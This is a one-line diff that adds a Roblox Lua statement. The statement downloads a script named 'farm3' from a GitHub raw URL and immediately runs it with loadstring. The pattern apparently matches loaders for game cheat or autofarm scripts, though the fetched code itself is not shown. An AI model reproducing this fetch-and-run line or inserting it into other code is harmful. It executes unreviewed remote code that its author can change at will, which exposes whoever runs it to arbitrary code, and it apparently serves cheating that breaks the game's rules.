@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/lanshrblx/empty/refs/heads/main/farm3", true))()
